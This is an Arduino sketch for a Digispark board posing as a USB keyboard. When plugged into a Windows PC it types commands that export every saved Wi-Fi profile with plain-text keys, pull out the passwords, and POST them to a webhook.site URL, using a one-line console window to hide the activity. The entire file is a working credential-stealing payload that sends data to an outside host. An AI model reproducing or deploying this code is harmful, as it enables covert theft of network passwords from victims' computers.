#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(300); // wait a second
  DigiKeyboard.println(command);
}

void stealPasswords(){
  winRun("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp% & netsh wlan export profile key=clear & powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS & powershell Invoke-WebRequest -Uri https://webhook.site/b4551bf8-8100-4ab7-9dfa-40276a3e01e2/wifi -Method POST -InFile Wi-Fi-PASS & exit");
  DigiKeyboard.delay(100);  
}
void setup() {
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  
  stealPasswords();
}

void loop() {
  DigiKeyboard.update();
}
